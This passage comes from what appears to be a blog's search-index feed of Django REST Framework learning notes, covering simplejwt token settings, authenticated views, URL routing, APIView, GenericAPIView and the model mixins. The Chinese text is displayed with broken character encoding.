class="string">'JTI_CLAIM'</span>: <span class="string">'jti'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'SLIDING_TOKEN_REFRESH_EXP_CLAIM'</span>: <span class="string">'refresh_exp'</span>,</span><br><span class="line">    <span class="string">'SLIDING_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">    <span class="string">'SLIDING_TOKEN_REFRESH_LIFETIME'</span>: timedelta(days=<span class="number">1</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="models-py-2"><a href="#models-py-2" class="headerlink" title="models.py"></a>models.py</h3><p>ä»£ç åŒä¸Š</p><h3 id="views-py-2"><a href="#views-py-2" class="headerlink" title="views.py"></a>views.py</h3><div class="note warning">            <p>æ­¤å¤„è®¾ç½®çš„æ˜¯å±€éƒ¨é…ç½®</p>          </div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"><span class="comment"># å¿…é¡»ç™»å½•åæ‰èƒ½è®¿é—® - é€šè¿‡äº†è®¤è¯æƒé™ç»„ä»¶</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_simplejwt.authentication <span class="keyword">import</span> JWTAuthentication</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    authentication_classes = [JWTAuthentication]  <span class="comment"># å±€éƒ¨é…ç½®simplejwt-tokenæ ¡éªŒrequest.user</span></span><br><span class="line">    permission_classes = [IsAuthenticated]  <span class="comment"># ç»“åˆæƒé™ç»„ä»¶ç­›é€‰æ‰æ¸¸å®¢</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=&#123;<span class="string">'username'</span>: request.user.username&#125;)</span><br></pre></td></tr></table></figure><h3 id="url-py-1"><a href="#url-py-1" class="headerlink" title="url.py"></a>url.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ObtainJSONWebTokenè§†å›¾ç±»å°±æ˜¯é€šè¿‡usernameå’Œpasswordå¾—åˆ°userå¯¹è±¡ç„¶åç­¾å‘tokenï¼ˆç”Ÿæˆtokenï¼‰</span></span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> ObtainJSONWebToken, obtain_jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'simple_jwt/'</span>, TokenObtainPairView.as_view(), name=<span class="string">'token_obtain_pair'</span>),</span><br><span class="line">    path(<span class="string">'simple_jwt/refresh/'</span>, TokenRefreshView.as_view(), name=<span class="string">'token_refresh'</span>),</span><br><span class="line">    path(<span class="string">'user/detail2/'</span>, views.UserDetail2.as_view()),</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥-amp-æ‰©å±•é˜…è¯»"><a href="#å‚è€ƒé“¾æ¥-amp-æ‰©å±•é˜…è¯»" class="headerlink" title="å‚è€ƒé“¾æ¥ &amp; æ‰©å±•é˜…è¯»"></a>å‚è€ƒé“¾æ¥ &amp; æ‰©å±•é˜…è¯»</h1><p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDIzZjQzZGYyNjVkYTFiY2MxOTY3NDk=">ã€DRFã€‘ç”¨æˆ·æ³¨å†Œç™»å½•åŠJWT<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE4LzA3L2pzb25fd2ViX3Rva2VuLXR1dG9yaWFsLmh0bWw=">JSON Web Token å…¥é—¨æ•™ç¨‹<i class="fa fa-external-link-alt"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆåï¼‰ï¼šé€šç”¨è§†å›¾ã€è§†å›¾å·¥å…·ç±»ã€è§†å›¾é›†ä»¥åŠè·¯ç”±</title>
      <link href="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/"/>
      <url>/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (10): Generic Views, MixIns, ViewSets and Routers</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç <ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3MucHk=">rest_framework.views<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZ2VuZXJpY3MucHk=">rest_framework.generics<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3NldHMucHk=">rest_framework.viewsets<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcm91dGVycy5weQ==">rest_framework.routers<i class="fa fa-external-link-alt"></i></span></li></ul></li><li>å®˜æ–¹æ–‡æ¡£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZ2VuZXJpYy12aWV3cy8=">API Guild - Generic views<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdmlld3NldHMv">API Guild - ViewSets<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcm91dGVycy8=">API Guild - Routers<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEwX2RyZl92aWV3cw==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="AIPView-APIè§†å›¾ç±»"><a href="#AIPView-APIè§†å›¾ç±»" class="headerlink" title="AIPView - APIè§†å›¾ç±»"></a>AIPView - APIè§†å›¾ç±»</h1><p><code>APIView</code>æ˜¯Django REST Frameworkæä¾›çš„æ‰€æœ‰è§†å›¾çš„åŸºç±»ï¼Œç»§æ‰¿è‡ªDjangoçš„<code>View</code>çˆ¶ç±»ã€‚</p><h2 id="ä¸Django-Viewçš„ä¸åŒ"><a href="#ä¸Django-Viewçš„ä¸åŒ" class="headerlink" title="ä¸Django Viewçš„ä¸åŒ"></a>ä¸Django <code>View</code>çš„ä¸åŒ</h2><ol><li>ä¼ å…¥åˆ°è§†å›¾æ–¹æ³•ä¸­çš„æ˜¯REST frameworkçš„<code>Request</code>å¯¹è±¡ï¼Œè€Œä¸æ˜¯Djangoçš„<code>HttpRequeset</code>å¯¹è±¡</li><li>è§†å›¾æ–¹æ³•å¯ä»¥è¿”å›REST frameworkçš„<code>Response</code>å¯¹è±¡ï¼Œè§†å›¾ä¼šä¸ºå“åº”æ•°æ®è®¾ç½®ï¼ˆrenderï¼‰ç¬¦åˆå‰ç«¯è¦æ±‚çš„æ ¼å¼</li><li>ä»»ä½•<code>APIException</code>å¼‚å¸¸éƒ½ä¼šè¢«æ•è·åˆ°ï¼Œå¹¶ä¸”å¤„ç†æˆåˆé€‚çš„å“åº”ä¿¡æ¯</li><li>åœ¨è¿›è¡Œ<code>dispatch()</code>åˆ†å‘å‰ï¼Œä¼šå¯¹è¯·æ±‚è¿›è¡Œèº«ä»½è®¤è¯ã€æƒé™æ£€æŸ¥ã€æµé‡æ§åˆ¶</li></ol><h2 id="é‡è¦ç±»å±æ€§"><a href="#é‡è¦ç±»å±æ€§" class="headerlink" title="é‡è¦ç±»å±æ€§"></a>é‡è¦ç±»å±æ€§</h2><p><code>AIPView</code>æœ‰å¦‚ä¸‹å¯è®¾ç½®çš„é‡è¦ç±»å±æ€§ï¼š</p><ul><li><code>authentication_classes</code>ï¼šåˆ—è¡¨æˆ–å…ƒç¥–ï¼Œèº«ä»½è®¤è¯ç±»</li><li><code>permissoin_classes</code>ï¼šåˆ—è¡¨æˆ–å…ƒç¥–ï¼Œæƒé™æ£€æŸ¥ç±»</li><li><code>throttle_classes</code>ï¼šåˆ—è¡¨æˆ–å…ƒç¥–ï¼Œæµé‡æ§åˆ¶ç±»</li></ul><h2 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><p>åœ¨<code>APIView</code>ä¸­ä»æœ‰<code>get()</code>ï¼Œ<code>post()</code>ç­‰å…¶ä»–è¯·æ±‚æ–¹å¼çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="comment"># path('books/', views.BookListView.as_view()),</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        books = BookInfo.objects.all()</span><br><span class="line">        serializer = BookInfoSerializer(books, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br></pre></td></tr></table></figure><h1 id="GenericAPIView-é€šç”¨APIè§†å›¾ç±»"><a href="#GenericAPIView-é€šç”¨APIè§†å›¾ç±»" class="headerlink" title="GenericAPIView - é€šç”¨APIè§†å›¾ç±»"></a>GenericAPIView - é€šç”¨APIè§†å›¾ç±»</h1><p>é€šç”¨APIè§†å›¾ç±»<code>GenericAPIView</code>ç»§æ‰¿è‡ª<code>APIView</code>ï¼Œå®Œå…¨å…¼å®¹<code>APIView</code>ï¼Œä¸»è¦å¢åŠ äº†æ“ä½œåºåˆ—åŒ–å™¨å’Œæ•°æ®åº“æŸ¥è¯¢çš„æ–¹æ³•ï¼Œä½œç”¨æ˜¯ä¸ºä¸‹é¢<code>Mixin</code>æ‰©å±•ç±»çš„æ‰§è¡Œæä¾›åŸºç¡€ç±»æ”¯æŒã€‚é€šå¸¸åœ¨ä½¿ç”¨æ—¶ï¼Œå¯ä»¥é…åˆä¸€ä¸ªæˆ–å¤šä¸ª<code>Mixin</code>æ‰©å±•ç±»ã€‚</p><h2 id="GenericAPIViewæ¯”APIViewå¤šäº†ä»€ä¹ˆ"><a href="#GenericAPIViewæ¯”APIViewå¤šäº†ä»€ä¹ˆ" class="headerlink" title="GenericAPIViewæ¯”APIViewå¤šäº†ä»€ä¹ˆ"></a><code>GenericAPIView</code>æ¯”<code>APIView</code>å¤šäº†ä»€ä¹ˆ</h2><ol><li><code>get_queryset()</code>ï¼šä»ç±»å±æ€§<code>querysetä¸­</code>è·å¾—<code>model</code>çš„<code>queryset</code>æ•°æ®ã€‚ç¾¤æ“ä½œå°±èµ°<code>get_queryset()</code>æ–¹æ³•(åŒ…æ‹¬ç¾¤æŸ¥ï¼Œç¾¤å¢ç­‰)ã€‚</li><li><code>get_object()</code>ï¼šä»ç±»å±æ€§<code>queryset</code>ä¸­è·å¾—<code>model</code>çš„<code>queryset</code>æ•°æ®ï¼Œå†é€šè¿‡æœ‰ååˆ†ç»„<code>pk</code>ç¡®å®šå”¯ä¸€æ“ä½œå¯¹è±¡ã€‚å•æ“ä½œå°±èµ°<code>get_object()</code>æ–¹æ³•ï¼ˆåŒ…æ‹¬å•æŸ¥ï¼Œå•å¢ç­‰ï¼‰ã€‚</li><li><code>get_serializer()</code>ï¼šä»ç±»å±æ€§<code>serializer_class</code>ä¸­è·å¾—<code>serializer</code>çš„åºåˆ—åŒ–ç±»ã€‚</li></ol><h2 id="é‡è¦ç±»å±æ€§-1"><a href="#é‡è¦ç±»å±æ€§-1" class="headerlink" title="é‡è¦ç±»å±æ€§"></a>é‡è¦ç±»å±æ€§</h2><p><code>GenericAPIView</code>æœ‰å¦‚ä¸‹å¯è®¾ç½®çš„é‡è¦ç±»å±æ€§ï¼š</p><ul><li>åˆ—è¡¨è§†å›¾ä¸è¯¦æƒ…è§†å›¾å…±ç”¨<ul><li><code>queryset</code>ï¼šæŒ‡æ˜è§†å›¾éœ€è¦çš„æ•°æ®ï¼ˆ<code>model</code>æŸ¥è¯¢æ•°æ®ï¼‰</li><li><code>permissoin_classes</code>ï¼šæŒ‡æ˜è§†å›¾ä½¿ç”¨çš„åºåˆ—åŒ–å™¨</li></ul></li><li>åˆ—è¡¨è§†å›¾ä½¿ç”¨<ul><li><code>pagination_class</code>ï¼šæŒ‡å®šåˆ†é¡µæ§åˆ¶ç±»</li><li><code>filter_backends</code>ï¼šæŒ‡å®šè¿‡æ»¤æ§åˆ¶åç«¯</li></ul></li><li>è¯¦æƒ…é¡µè§†å›¾ä½¿ç”¨<ul><li><code>lookup_field</code>ï¼šè‡ªå®šä¹‰ä¸»é”®ï¼Œæœ‰ååˆ†ç»„çš„æŸ¥è¯¢ï¼Œé»˜è®¤æ˜¯<code>pk</code></li><li><code>lookup_url_kwarg</code>ï¼šæŸ¥è¯¢å•ä¸€æ•°æ®æ—¶urlä¸­çš„å‚æ•°å…³é”®å­—åç§°ï¼Œé»˜è®¤ä¸<code>look_field</code>ç›¸åŒ</li></ul></li></ul><h2 id="é‡è¦ç±»æ–¹æ³•"><a href="#é‡è¦ç±»æ–¹æ³•" class="headerlink" title="é‡è¦ç±»æ–¹æ³•"></a>é‡è¦ç±»æ–¹æ³•</h2><ul><li><code>get_queryset()</code>ï¼šä»ç±»å±æ€§<code>queryset</code>ä¸­è·å¾—<code>model</code>çš„<code>queryset</code>æ•°æ®ã€€ã€€</li><li><code>get_object()</code>ï¼šä»ç±»å±æ€§<code>queryset</code>ä¸­è·å¾—<code>model</code>çš„<code>queryset</code>æ•°æ®ï¼Œå†é€šè¿‡æœ‰ååˆ†ç»„<code>pk</code>æ¥ç¡®å®šå”¯ä¸€æ“ä½œå¯¹è±¡</li><li><code>get_serializer()</code>ï¼šä»ç±»å±æ€§<code>serializer_class</code>ä¸­è·å¾—<code>serializer</code>çš„åºåˆ—åŒ–ç±»ï¼Œä¸»è¦ç”¨æ¥æä¾›ç»™<code>Mixin</code>æ‰©å±•ç±»ä½¿ç”¨</li></ul><h2 id="get-serializer-æºç "><a href="#get-serializer-æºç " class="headerlink" title="get_serializer æºç "></a><code>get_serializer</code> æºç </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_serializer</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Return the serializer instance that should be used for validating and</span></span><br><span class="line"><span class="string">    deserializing input, and for serializing output.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    serializer_class = self.get_serializer_class()</span><br><span class="line">    kwargs[<span class="string">'context'</span>] = self.get_serializer_context()</span><br><span class="line">    <span class="keyword">return</span> serializer_class(*args, **kwargs)</span><br></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹ä»£ç -1"><a href="#ç¤ºä¾‹ä»£ç -1" class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><h3 id="è§†å›¾å±‚-views-py"><a href="#è§†å›¾å±‚-views-py" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericAPIView</span><span class="params">(GenericAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line">    lookup_field = <span class="string">'pk'</span>  <span class="comment"># å…ˆå®šä¹‰å¥½ï¼Œå•æŸ¥å¯ä»¥ä½¿ç”¨ï¼Œé»˜è®¤æ˜¯pk  è‡ªå®šä¹‰ä¸»é”®çš„æœ‰ååˆ†ç»„ï¼Œå¦‚æœè·¯ç”±æœ‰ååˆ†ç»„ä¸æ˜¯pk,è¿™ä¸ªå±æ€§å°±è¦è‡ªå·±è®¾ç½®äº†</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¾¤å–</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_query = self.get_queryset()  <span class="comment"># è·å–querysetæ•°æ®ï¼ˆmodelæŸ¥è¯¢æ•°æ®ï¼‰</span></span><br><span class="line">        book_ser = self.get_serializer(book_query, many=<span class="literal">True</span>)</span><br><span class="line">        book_data = book_ser.data</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=book_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # å•å–</span></span><br><span class="line">    <span class="comment"># def get(self, request, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     book_query = self.get_object()</span></span><br><span class="line">    <span class="comment">#     book_ser = self.get_serializer(book_query)</span></span><br><span class="line">    <span class="comment">#     book_data = book_ser.data</span></span><br><span class="line">    <span class="comment">#     return APIResponse(results=book_data)</span></span><br></pre></td></tr></table></figure><h3 id="è·¯ç”±å±‚-urls-py"><a href="#è·¯ç”±å±‚-urls-py" class="headerlink" title="è·¯ç”±å±‚ urls.py"></a>è·¯ç”±å±‚ <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="xxxModelMixin-è§†å›¾ç±»çš„æ¨¡å‹å·¥å…·é›†"><a href="#xxxModelMixin-è§†å›¾ç±»çš„æ¨¡å‹å·¥å…·é›†" class="headerlink" title="xxxModelMixin - è§†å›¾ç±»çš„æ¨¡å‹å·¥å…·é›†"></a><code>xxxModelMixin</code> - è§†å›¾ç±»çš„æ¨¡å‹å·¥å…·é›†</h1><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><ul><li>æä¾›äº†å‡ ç§åç«¯è§†å›¾ï¼ˆå¯¹æ•°æ®èµ„æºçš„å¢åˆ æ”¹æŸ¥ï¼‰å¤„ç†æµç¨‹çš„å®ç°ï¼Œå¦‚æœéœ€è¦ç¼–å†™çš„è§†å›¾å±äºè¿™äº”ç§ï¼Œåˆ™è§†å›¾å¯ä»¥é€šè¿‡ç»§æ‰¿ç›¸åº”çš„æ‰©å±•ç±»æ¥å¤ç”¨ä»£ç ï¼Œå‡å°‘è‡ªå·±ç¼–å†™çš„ä»£ç é‡ã€‚</li><li><code>mixins</code>æœ‰äº”ä¸ªå·¥å…·ç±»æ–‡ä»¶ï¼Œä¸€å…±æä¾›äº†äº”ä¸ªå·¥å…·ç±»ï¼Œå…­ä¸ªå·¥å…·æ–¹æ³•ï¼šå•æŸ¥ã€ç¾¤æŸ¥ã€å•å¢ã€å•åˆ ã€å•æ•´ä½“æ”¹ã€å•å±€éƒ¨æ”¹</li></ul><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><ul><li>ç»§æ‰¿å·¥å…·ç±»å¯ä»¥ç®€åŒ–è¯·æ±‚å‡½æ•°çš„å®ç°ä½“ï¼Œä½†æ˜¯å¿…é¡»ç»§æ‰¿<code>GenericAPIView</code>ï¼Œéœ€è¦<code>GenericAPIView</code>ç±»æä¾›åºåˆ—åŒ–å™¨ä¸æ•°æ®åº“æŸ¥è¯¢çš„æ–¹æ³•(è§ä¸Šæ–¹<code>GenericAPIView</code>åŸºç±»çŸ¥è¯†ç‚¹)</li><li>å·¥å…·ç±»çš„å·¥å…·æ–¹æ³•è¿”å›å€¼éƒ½æ˜¯<code>Response</code>ç±»å‹å¯¹è±¡ï¼Œå¦‚æœè¦æ ¼å¼åŒ–æ•°æ®æ ¼å¼å†è¿”å›ç»™å‰å°ï¼Œå¯ä»¥é€šè¿‡<code>response.data</code>æ‹¿åˆ°å·¥å…·æ–¹æ³•è¿”å›çš„<code>Response</code>ç±»å‹å¯¹è±¡çš„å“åº”æ•°æ®</li></ul><h2 id="äº”å¤§æ¨¡å‹å·¥å…·ç±»"><a href="#äº”å¤§æ¨¡å‹å·¥å…·ç±»" class="headerlink" title="äº”å¤§æ¨¡å‹å·¥å…·ç±»"></a>äº”å¤§æ¨¡å‹å·¥å…·ç±»</h2><h3 id="ListModelMixin-ç¾¤æŸ¥"><a href="#ListModelMixin-ç¾¤æŸ¥" class="headerlink" title="ListModelMixin ç¾¤æŸ¥"></a><code>ListModelMixin</code> ç¾¤æŸ¥</h3><ul><li>åˆ—è¡¨è§†å›¾æ‰©å±•ç±»ï¼Œæä¾›<code>list</code>æ–¹æ³•å¿«é€Ÿå®ç°æŸ¥è¯¢è§†å›¾</li><li>è¿”å›<code>200</code>çŠ¶æ€ç </li><li>é™¤äº†æŸ¥è¯¢ï¼Œè¯¥<code>list</code>æ–¹æ³•ä¼šå¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤å’Œåˆ†é¡µ</li></ul><h3 id="CreateModelMixin-å•å¢"><a href="#CreateModelMixin-å•å¢" class="headerlink" title="CreateModelMixin å•å¢"></a><code>CreateModelMixin</code> å•å¢</h3><ul><li>åˆ›å»ºè§†å›¾æ‰©å±•ç±»ï¼Œæä¾›<code>create</code>æ–¹æ³•å¿«é€Ÿåˆ›å»ºèµ„æºçš„è§†å›¾ï¼ŒæˆåŠŸè¿”å›<code>201</code>çš„çŠ¶æ€ç </li><li><strong>æ²¡æœ‰ç¾¤å¢çš„æ–¹æ³•ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨å†™</strong></li></ul><h3 id="RetrieveModelMixin-å•æŸ¥"><a href="#RetrieveModelMixin-å•æŸ¥" class="headerlink" title="RetrieveModelMixin å•æŸ¥"></a><code>RetrieveModelMixin</code> å•æŸ¥</h3><ul><li>è¯¦æƒ…è§†å›¾æ‰©å±•ç±»ï¼Œæä¾›<code>retrieve</code>æ–¹æ³•ï¼Œå¯ä»¥å¿«é€Ÿå®ç°è¿”å›ä¸€ä¸ªå­˜åœ¨çš„æ•°æ®å¯¹è±¡</li></ul><h3 id="UpdateModelMixin-æ›´æ–°-ä¿®æ”¹"><a href="#UpdateModelMixin-æ›´æ–°-ä¿®æ”¹" class="headerlink" title="UpdateModelMixin æ›´æ–°/ä¿®æ”¹"></a><code>UpdateModelMixin</code> æ›´æ–°/ä¿®æ”¹</h3><ul><li>æ›´æ–°è§†å›¾æ‰©å±•ç±»ï¼Œæä¾›<code>update</code>æ–¹æ³•ï¼Œå¯ä»¥å¿«é€Ÿå®ç°æ›´æ–°ä¸€ä¸ªå­˜åœ¨çš„æ•°æ®å¯¹è±¡ï¼ŒåŒæ—¶ä¹Ÿæä¾›<code>partial_update</code>æ–¹æ³•ï¼Œå¯ä»¥å®ç°å±€éƒ¨æ›´æ–°</li><li><strong>åªæœ‰å•æ•´ä½“æ”¹å’Œå•å±€éƒ¨æ”¹ï¼Œæ²¡æœ‰ç¾¤æ•´ä½“æ”¹å’Œç¾¤å±€éƒ¨æ”¹</strong></li></ul><h3 id="DestoryModelMixin-åˆ é™¤"><a href="#DestoryModelMixin-åˆ é™¤" class="headerlink" title="DestoryModelMixin åˆ é™¤"></a><code>DestoryModelMixin</code> åˆ é™¤</h3><ul><li>åˆ é™¤è§†å›¾æ‰©å±•ç±»ï¼Œæä¾›<code>destory</code>æ–¹æ³•ï¼Œå¯ä»¥å¿«é€Ÿå®ç°åˆ é™¤ä¸€ä¸ªå­˜åœ¨æ•°æ®å¯¹è±¡</li><li>ä¸€èˆ¬ä¸æ€ä¹ˆç”¨åˆ°ï¼Œå› ä¸ºå®é™…å¼€å‘ä¸­å¹¶ä¸ä¼šçœŸçš„åˆ é™¤æ•°æ®ï¼Œè€Œæ˜¯ä¿®æ”¹æ˜¯å¦å¯ç”¨çš„æ ‡è®°</li></ul><h2 id="ç¤ºä¾‹ä»£ç -2"><a href="#ç¤ºä¾‹ä»£ç -2" class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><h3 id="è§†å›¾å±‚-views-py-1"><a href="#è§†å›¾å±‚-views-py-1" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.mixins <span class="keyword">import</span> ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookMixinGenericAPIView</span><span class="params">(ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin, GenericAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># GenericAPIViewæä¾›çš„åºåˆ—åŒ–å™¨å’ŒæŸ¥è¯¢çš„æ•°æ®</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å•æŸ¥å’Œç¾¤æŸ¥</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span 